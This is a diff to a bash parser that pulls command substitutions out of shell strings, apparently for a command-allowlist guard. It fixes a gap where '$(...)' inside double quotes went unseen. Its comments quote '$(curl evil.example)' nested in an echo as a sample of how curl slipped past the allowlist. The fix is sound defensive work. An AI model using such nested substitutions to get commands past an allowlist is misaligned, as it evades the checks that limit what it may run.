@@ -173,6 +173,12 @@ _extract_substitutions() {
   local in_sq=0 in_dq=0
   local depth=0 start=0 esc=0
   local in_bt=0 bt_start=0
+  # `in_dq_saved` remembers the OUTER in_dq state when we descend into
+  # a $(...) substitution from inside double quotes. Without saving +
+  # resetting, the depth>0 walk re-enters the in_dq branch and never
+  # sees the matching ')'. Codex R3 follow-up — pinned by the bats
+  # `$(curl evil) INSIDE double quotes is BLOCKED`.
+  local in_dq_saved=0
   local c c2
   while [[ $i -lt $n ]]; do
     c="${s:$i:1}"
@@ -180,7 +186,10 @@ _extract_substitutions() {
     if [[ "$esc" -eq 1 ]]; then
       esc=0; i=$((i + 1)); continue
     fi
-    # Inside a $( … ) / <( … ) — depth-tracking + quote-aware.
+    # Inside a $( … ) / <( … ) — depth-tracking. Inner quote state
+    # is tracked SEPARATELY (the substitution body is its own bash
+    # context — operators inside the body are not the outer-shell
+    # operators we care about for segmentation).
     if [[ $depth -gt 0 ]]; then
       if [[ $in_sq -eq 1 ]]; then
         [[ "$c" == "'" ]] && in_sq=0
@@ -201,6 +210,9 @@ _extract_substitutions() {
           depth=$((depth - 1))
           if [[ $depth -eq 0 ]]; then
             printf '%s\n' "${s:$start:$((i - start))}"
+            # Restore the outer in_dq state we saved on descent.
+            in_dq=$in_dq_saved
+            in_dq_saved=0
           fi
         fi
       fi
@@ -217,11 +229,34 @@ _extract_substitutions() {
     fi
     # Top level (depth 0, not in backtick).
     if [[ $in_sq -eq 1 ]]; then
+      # Single quotes are literal in bash — NO substitution inside.
       [[ "$c" == "'" ]] && in_sq=0
     elif [[ $in_dq -eq 1 ]]; then
+      # Codex R3 follow-up: bash DOES expand $(…), <(…), and `…`
+      # inside double quotes. The previous branch only tracked the
+      # closing `"` and the `\\` escape — `$(curl evil.example)` inside
+      # `"…"` was invisible to the extractor → outer `echo` allowed
+      # → curl ran without allowlist enforcement.
       case "$c" in
-        '"') in_dq=0 ;;
-        '\\') esc=1 ;;
+        '"') in_dq=0; i=$((i + 1)); continue ;;
+        '\\') esc=1; i=$((i + 1)); continue ;;
+        '`')
+          in_bt=1
+          bt_start=$((i + 1))
+          i=$((i + 1)); continue
+          ;;
+      esac
+      case "$c2" in
+        '$('|'<(')
+          # Save outer in_dq so it can be restored when this
+          # substitution closes — otherwise the depth-walk would
+          # re-enter the in_dq branch and miss the matching `)`.
+          in_dq_saved=$in_dq
+          in_dq=0
+          depth=1
+          start=$((i + 2))
+          i=$((i + 2)); continue
+          ;;
       esac
     else
       case "$c" in
